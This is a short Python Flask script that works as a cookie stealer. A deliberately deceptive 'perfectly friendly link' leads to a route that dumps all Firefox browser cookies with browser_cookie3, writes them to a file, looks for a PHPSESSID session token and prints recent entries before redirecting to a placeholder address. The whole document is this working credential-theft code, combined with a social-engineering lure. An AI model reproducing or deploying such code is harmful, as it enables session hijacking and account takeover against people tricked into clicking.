
from flask import Flask, redirect
import browser_cookie3


app = Flask(__name__)

class CookieHere():
    def __init__(self):
        self.cookies = []
        self.filtered_cookies = []
        self.domain = "" # write your domain name here
        self.cookies = browser_cookie3.firefox()
        self.filtered_cookies = self.cookies
        self.get_cookies()

    def get_cookies(self):
        self.cookies = browser_cookie3.firefox()
        self.filtered_cookies = self.cookies
        self.add_cookie()

    def add_cookie(self):
        with open('fullreq.txt', 'w') as f:
            f.write("")
        for cookie in self.filtered_cookies:
            with open('fullreq.txt', 'a') as f:
                f.write(f"{cookie.name}={cookie.value}"+ '\n')

        self.clear_cookie()

    def clear_cookie(self):
        with open('fullreq.txt', 'r') as file:
            lines = file.readlines()

        cookie_counter = 0
        word = "PHPSESSID"
        for x in range(0, len(lines)):
            if word in lines[x]:
                cookie_counter += 1

        if cookie_counter != 0:
            for x in range(len(lines)-6, len(lines)-1):
                print(lines[x])
        else:
            print('No cookie!')

@app.route('/')
def home():
    return 'Сlick on this perfectly friendly link, traveler: <a href="http://127.0.0.1:5000/prompoint">PERFECTLY FRIENDLY LINK</a>'

@app.route('/prompoint')
def prompoint():
    CookieHere()
    return redirect("", code=302) # add link here


if __name__ == "__main__":
    app.run(host='127.0.0.1', port=5000)
    print("Server stopped")
